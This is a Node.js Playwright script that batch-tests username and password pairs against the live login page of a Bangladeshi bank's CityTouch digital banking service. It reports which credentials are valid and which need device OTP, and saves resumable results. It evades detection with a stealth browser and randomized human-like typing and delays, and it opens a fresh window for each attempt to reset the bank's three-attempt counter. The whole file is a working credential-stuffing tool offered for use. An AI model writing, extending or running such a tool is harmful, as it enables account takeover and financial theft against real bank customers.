#!/usr/bin/env node
/**
 * CityTouch (City Bank digital banking) login automation — https://citytouch.com.bd/
 *
 * Flow (mapped live):
 *   1. GET https://citytouch.com.bd/               -> SPA login page (User ID + Password, no captcha)
 *   2. click Login                                 -> POST https://k2prod.citybankplc.com/gateway/oauth2/token
 *      body {"data": "<JWE>"} (RSA-OAEP-256 + A256GCM, encrypted client-side by the SPA)
 *   3. Wrong creds -> toast "Incorrect Credentials ... You have N attempts left"
 *      Success     -> SPA routes to /dashboard
 *
 * Response map:
 *   toast "Incorrect Credentials"          -> INVALID_CREDS (note attempts-left countdown)
 *   "New Device Found" (OTP/registration)  -> DEVICE_VERIFY (creds VALID; needs device OTP)
 *   "No Eligible Account/Card"             -> NO_ELIGIBLE_ACCOUNT (creds VALID, no device-eligible accounts)
 *   toast contains "locked"/"temp"         -> LOCKED
 *   URL leaves / (dashboard etc.)          -> SUCCESS
 *
 * Usage:
 *   node scripts/citytouch_login.mjs "user:pass"
 *   node scripts/citytouch_login.mjs --batch "u1:p1,u2:p2,..."
 *   node scripts/citytouch_login.mjs --batch /path/to/creds.txt
 *   node scripts/citytouch_login.mjs --batch file --gap 10   (seconds between attempts, default 15)
 *   node scripts/citytouch_login.mjs --batch file --out /tmp/ct.json
 *   Resumable: results saved after each attempt; INVALID_CREDS/LOCKED/SUCCESS are skipped on
 *   restart, ERROR retried. LOCKED creds are recorded and never retried. Fresh window per attempt.
 */
import { chromium } from '/Volumes/Spare/npm/global/lib/node_modules/@playwright/mcp/node_modules/playwright/index.mjs';
import fs from 'node:fs';

const CLOAK = '/Users/m/.cloakbrowser/chromium-145.0.7632.109.2/Chromium.app/Contents/MacOS/Chromium';
const HOME = 'https://citytouch.com.bd/';
const rand = (min, max) => min + Math.random() * (max - min);
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

async function typeField(page, selector, text) {
  await page.click(selector);
  await sleep(rand(150, 450));
  await page.type(selector, text, { delay: rand(20, 70) });
}

async function tryLogin(page, uid, pwd) {
  await page.goto(HOME, { waitUntil: 'load', timeout: 60000 });
  await sleep(rand(1800, 4000));

  await typeField(page, 'input[name="User ID"]', uid);
  await sleep(rand(200, 600));
  await typeField(page, 'input[name="Password"]', pwd);
  await sleep(rand(600, 2000));
  await page.click('button:has-text("Login")');
  await sleep(rand(6000, 9000));

  const out = await page.evaluate(() => ({
    url: location.href,
    bodyText: document.body.innerText.replace(/\s+/g, ' ').slice(0, 500),
  }));
  return classify(out);
}

function classify(o) {
  const t = o.bodyText;
  if (!/^https:\/\/citytouch\.com\.bd\/?$/.test(o.url) || o.url.includes('/dashboard')) {
    return { status: 'SUCCESS', detail: 'redirected to ' + o.url };
  }
  const attempts = (t.match(/(\d+) attempts? left/) || [])[1];
  if (t.includes('No Eligible Account')) return { status: 'NO_ELIGIBLE_ACCOUNT', detail: 'oauth2/token OK but no device-eligible account/card' };
  if (t.includes('New Device')) return { status: 'DEVICE_VERIFY', detail: 'creds accepted; device OTP/registration required' };
  if (t.includes('Incorrect Credentials')) {
    return { status: 'INVALID_CREDS', detail: attempts ? 'attempts left: ' + attempts : 'wrong user/pass' };
  }
  if (/(locked|temporarily|too many|suspended)/i.test(t)) return { status: 'LOCKED', detail: t.slice(0, 160) };
  return { status: 'UNKNOWN', detail: t.slice(0, 160) };
}

// ---- main ----
const args = process.argv.slice(2);
const batchIdx = args.indexOf('--batch');
const raw = batchIdx !== -1 ? args[batchIdx + 1] : args.find(a => !a.startsWith('--'));
const pairs = (raw && fs.existsSync(raw) ? fs.readFileSync(raw, 'utf8').split('\n').map(l => l.trim()).filter(Boolean) : (raw || '').split(',').map(s => s.trim()).filter(Boolean));
if (!pairs.length) { console.log('usage: node citytouch_login.mjs "user:pass" | --batch <file>'); process.exit(1); }

const gapIdx = args.indexOf('--gap');
const GAP_BASE = gapIdx !== -1 ? Number(args[gapIdx + 1]) || 15 : 15;
const outIdx = args.indexOf('--out');
const OUT = outIdx !== -1 ? args[outIdx + 1] : '/tmp/citytouch_batch_results.json';
const results = fs.existsSync(OUT) ? JSON.parse(fs.readFileSync(OUT, 'utf8')) : {};
const SKIP_STATUS = { INVALID_CREDS: 1, LOCKED: 1, SUCCESS: 1, DEVICE_VERIFY: 1, NO_ELIGIBLE_ACCOUNT: 1 };

let browser = null;
for (const pair of pairs) {
  const [u, p] = pair.split(':');
  if (!u || !p) { console.log('skip bad pair:', pair); continue; }
  if (results[u] && SKIP_STATUS[results[u].status]) { console.log(`${u} -> SKIP (already ${results[u].status})`); continue; }
  // fresh window per attempt (resets the per-session 3-attempt counter too)
  if (browser) await browser.close();
  browser = await chromium.launch({ headless: false, executablePath: CLOAK, args: ['--window-size=1440,900'] });
  const ctx = await browser.newContext({ viewport: { width: 1440, height: 900 } });
  const page = await ctx.newPage();
  let res;
  try {
    res = await tryLogin(page, u, p);
    console.log(`${u} -> ${res.status} (${res.detail})`);
  } catch (e) {
    console.log(`${u} -> ERROR: ${e.message}`);
    res = { status: 'ERROR', detail: e.message };
  }
  results[u] = res;
  fs.writeFileSync(OUT, JSON.stringify(results, null, 1));
  if (batchIdx !== -1 && pairs.length > 1) { const gap = rand(GAP_BASE * 0.5, GAP_BASE * 1.5) * 1000; console.log('waiting ' + Math.round(gap / 1000) + 's...'); await sleep(gap); }
}
console.log('results saved to ' + OUT);
if (browser) await browser.close();
